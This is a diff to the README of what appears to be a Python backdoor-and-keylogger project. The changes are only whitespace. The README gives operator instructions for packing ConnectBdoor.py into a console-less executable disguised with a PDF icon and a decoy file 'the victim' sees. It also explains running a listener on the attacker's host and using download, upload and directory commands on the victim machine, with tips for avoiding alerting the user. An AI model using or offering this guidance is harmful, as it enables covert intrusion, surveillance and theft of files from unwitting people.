@@ -29,15 +29,15 @@ Note: The initial mail will be sent to you when you switch on the Keylogger. All
 ### <a id="converting" style="color: rgb(0,0,0)"><u>Converting into an Executable</u></a>:
 1. We will use the `pyinstaller` module for this. Make sure you have python3.7 installed on the host system you control
 
- `pip3 install pyinstaller`
+    `pip3 install pyinstaller`
 
 2. Run the following command to combine the file as one and run it:
 
- `pyinstaller --add-data "<Full-Path>;." --icon "<Full-Pathto-ico-File>" --one-file --noconsole <Name of the base py file>`
+    `pyinstaller --add-data "<Full-Path>;." --icon "<Full-Pathto-ico-File>" --one-file --noconsole <Name of the base py file>`
 
- <b> Substitute `<Full-Path>` with the path where your .jpg or .pdf file is located in the host computer you control. Similarly substitute `<Full-Pathto-ico-File>` with the ico file you want the victim to see (For eg: The ico file can be the Adobe PDF icon). </b>
+    <b> Substitute `<Full-Path>` with the path where your .jpg or .pdf file is located in the host computer you control. Similarly substitute `<Full-Pathto-ico-File>` with the ico file you want the victim to see (For eg: The ico file can be the Adobe PDF icon). </b>
 
- <b> The `<Name of the base py file>` is the base py file that will be run in the victim machine. Substitute `ConnectBdoor.py` in its place for the file to work as this is the main py file. If you change the name of this py file, make sure you change it while creating the .exe as well!! </b>
+    <b> The `<Name of the base py file>` is the base py file that will be run in the victim machine. Substitute `ConnectBdoor.py` in its place for the file to work as this is the main py file. If you change the name of this py file, make sure you change it while creating the .exe as well!! </b>
 
 ### <a id="Running" style="color: rgb(0,0,0)"><u>Running the Backdoor</u></a>:
 1. Run the `listen.py` file in the host computer you control.
@@ -47,20 +47,20 @@ Note: The initial mail will be sent to you when you switch on the Keylogger. All
 
 #### List of Commands:
 1. `download` - This command takes 2 arguments.
- Full syntax: `download <Full File Path in Victim Machine> <Full Path in Host Machine>`.
+    Full syntax: `download <Full File Path in Victim Machine> <Full Path in Host Machine>`.
 
- <b><u>Note</u></b>: The <b>Full paths</b> need to be given in `double quotes`. Or if you want to download a file in the current folder, you may use just the `Filename`. In this case <b>no double quotes are needed</b>.
+    <b><u>Note</u></b>: The <b>Full paths</b> need to be given in `double quotes`. Or if you want to download a file in the current folder, you may use just the `Filename`. In this case <b>no double quotes are needed</b>.
  Only the first argument is compulsory!
 
 2. `upload`- This command takes 2 arguments.
- Full syntax: `upload <Full File Path in Host Machine> <Full Path in Victim Machine>`.
+    Full syntax: `upload <Full File Path in Host Machine> <Full Path in Victim Machine>`.
 
- <b><u>Note</u></b>: The <b>Full paths</b> need to be given in `double quotes`. Or if you want to upload a file in the current folder of where the Backdoor is located on the <b>Victim Machine</b>, you may use just the `Filename`. In this case <b>no double quotes are needed</b>. (You may not know where the victim has downloaded and executed the file from - eg: If they executed the backdoor from the desktop, if you upload the file by not giving your desired full path, all your files will be uploaded to the desktop and can alert the user!)
+    <b><u>Note</u></b>: The <b>Full paths</b> need to be given in `double quotes`. Or if you want to upload a file in the current folder of where the Backdoor is located on the <b>Victim Machine</b>, you may use just the `Filename`. In this case <b>no double quotes are needed</b>. (You may not know where the victim has downloaded and executed the file from - eg: If they executed the backdoor from the desktop, if you upload the file by not giving your desired full path, all your files will be uploaded to the desktop and can alert the user!)
 
 3. `cd` - This command takes a single argument.
- Full syntax: `cd <Full-Path of Folder in double Quotes or FolderName>`.
+    Full syntax: `cd <Full-Path of Folder in double Quotes or FolderName>`.
 
- <b><u>Note</u></b>: Full path needs to be given in case the user wants to change to a folder not in current directory. Can also use `cd ..` if one wants to go to previous directory.
+    <b><u>Note</u></b>: Full path needs to be given in case the user wants to change to a folder not in current directory. Can also use `cd ..` if one wants to go to previous directory.
 
 4. `pwd` - Prints the Present Working Directory and does not take any arguments!
 
